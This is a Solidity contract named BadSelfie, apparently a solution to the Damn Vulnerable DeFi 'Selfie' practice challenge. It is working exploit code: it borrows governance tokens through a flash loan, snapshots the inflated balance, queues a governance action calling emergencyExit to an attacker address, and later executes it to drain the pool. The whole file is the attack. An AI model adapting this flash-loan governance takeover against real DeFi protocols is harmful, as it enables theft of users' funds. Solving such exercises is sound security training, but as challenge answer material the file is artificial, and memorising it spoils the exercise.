//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "../DamnValuableTokenSnapshot.sol";

/**
 * @title BadGovernance.sol
 * @author Kent Miguel
 * @notice This contract is a malicious contract used to drain DVT tokens from pool using the SimpleGovernance contract
 */
contract BadSelfie is IERC3156FlashBorrower {
    SelfiePool private immutable selfiePool;
    SimpleGovernance private immutable simpleGovernance;
    ERC20Snapshot public immutable snapToken;
    DamnValuableTokenSnapshot public immutable dvt;

    address tokenAddress;
    uint256 attackActionId;
    uint256 tokenAmount;
    address attacker;

    /**
     * Initialize pool, governance, and token
     */
    constructor(
        address _selfiePool,
        address _simpleGovernance,
        address _token,
        address _snapToken,
        address _attacker
    ) {
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        tokenAddress = _token;
        snapToken = ERC20Snapshot(_snapToken);
        dvt = DamnValuableTokenSnapshot(_snapToken);
        attacker = _attacker;
    }

    /**
     * Get flashLoan() -> queueAction -> return flashLoan
     * move block 2 days
     */
    function attackPhase1() public {
        selfiePool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            tokenAddress,
            selfiePool.maxFlashLoan(tokenAddress),
            // selfiePool.flashFee(tokenAddress, 0),
            bytes("")
        );
    }

    /**
     * after moving 2 days...
     * Call executeAction(actionId)
     */
    function attackPhase2() public {
        //governance contract will execute which will bypass onlyGovernance modifier
        simpleGovernance.executeAction(attackActionId);
    }

    /**
     *
     * @param _receiver - initiator of loan which is this address
     * @param _token - loan currency which is DVT
     * @param _amount - amount of tokens
     * @param _fee - additional amount to repay
     * @param data - can just be empty ???  bytes("")
     *
     * must return callback message keccak256("ERC3156FlashBorrower.onFlashLoan")
     * @dev will call governance's queueAction
     */
    function onFlashLoan(
        address _receiver,
        address _token,
        uint256 _amount,
        uint256 _fee,
        bytes calldata data
    ) external returns (bytes32) {
        //get loan
        tokenAmount = snapToken.balanceOf(address(this));
        //approve to transfer token
        ERC20(tokenAddress).approve(address(selfiePool), _amount);
        ERC20(tokenAddress).approve(address(this), _amount);
        ERC20(tokenAddress).approve(msg.sender, _amount);
        //take snapshot
        dvt.snapshot();

        // //queue action - need to pass NotEnoughVotes...
        attackActionId = simpleGovernance.queueAction(
            address(selfiePool),
            uint128(0),
            abi.encodeWithSignature("emergencyExit(address)", attacker)
        );

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function getAttackId() external view returns (uint256) {
        return attackActionId;
    }

    function getTokenAmount() external view returns (uint256) {
        return tokenAmount;
    }

    function getMaxFlashLoan() external view returns (uint256) {
        return selfiePool.maxFlashLoan(tokenAddress);
    }

    receive() external payable {
        tokenAmount = snapToken.balanceOf(address(this));
    }
}
